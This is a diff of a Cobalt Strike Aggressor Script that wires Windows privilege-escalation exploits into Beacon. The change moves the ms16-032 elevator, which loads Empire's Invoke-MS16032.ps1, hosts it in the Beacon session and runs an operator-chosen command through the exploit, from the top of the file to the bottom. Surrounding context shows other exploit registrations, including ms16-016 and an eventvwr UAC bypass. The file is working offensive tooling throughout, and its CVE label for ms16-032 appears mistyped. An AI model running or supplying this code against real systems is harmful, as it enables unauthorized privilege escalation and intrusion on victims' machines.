@@ -2,28 +2,6 @@
 # Integrate several privilege escalation exploits into Cobalt Strike via Aggressor Script
 # 
 
-# Integrate ms16-032
-# Sourced from Empire: https://github.com/adaptivethreat/Empire/tree/master/data/module_source/privesc
-sub ms16_032_elevator {
-	local('$handle $script $oneliner');
-
-	# acknowledge this command
-	btask($1, "Tasked Beacon to execute $2 via ms16-032", "T1068");
-
-	# read in the script
-	$handle = openf(getFileProper(script_resource("modules"), "Invoke-MS16032.ps1"));
-	$script = readb($handle, -1);
-	closef($handle);
-
-	# host the script in Beacon
-	$oneliner = beacon_host_script($1, $script);
-
-	# run the specified command via this exploit.
-	bpowerpick!($1, "$oneliner $+ ; Invoke-MS16032 -Command \" $+ $2 $+ \"");
-}
-
-beacon_elevator_register("ms16-032", "Secondary Logon Handle Privilege Escalation (CVE-2016-099)", &ms16_032_elevator); 
-
 # Integrate Matt Nelson's file-less eventvwr.exe Bypass UAC attack
 # Sourced from Empire: https://github.com/adaptivethreat/Empire/tree/master/data/module_source/privesc
 sub eventvwr_elevator {
@@ -153,3 +131,26 @@ sub ms16_016_exploit {
 }
 
 beacon_exploit_register("ms16-016", "mrxdav.sys WebDav Local Privilege Escalation (CVE 2016-0051)", &ms16_016_exploit);
+
+# Integrate ms16-032
+# Sourced from Empire: https://github.com/adaptivethreat/Empire/tree/master/data/module_source/privesc
+sub ms16_032_elevator {
+	local('$handle $script $oneliner');
+
+	# acknowledge this command
+	btask($1, "Tasked Beacon to execute $2 via ms16-032", "T1068");
+
+	# read in the script
+	$handle = openf(getFileProper(script_resource("modules"), "Invoke-MS16032.ps1"));
+	$script = readb($handle, -1);
+	closef($handle);
+
+	# host the script in Beacon
+	$oneliner = beacon_host_script($1, $script);
+
+	# run the specified command via this exploit.
+	bpowerpick!($1, "$oneliner $+ ; Invoke-MS16032 -Command \" $+ $2 $+ \"");
+}
+
+beacon_elevator_register("ms16-032", "Secondary Logon Handle Privilege Escalation (CVE-2016-099)", &ms16_032_elevator); 
+
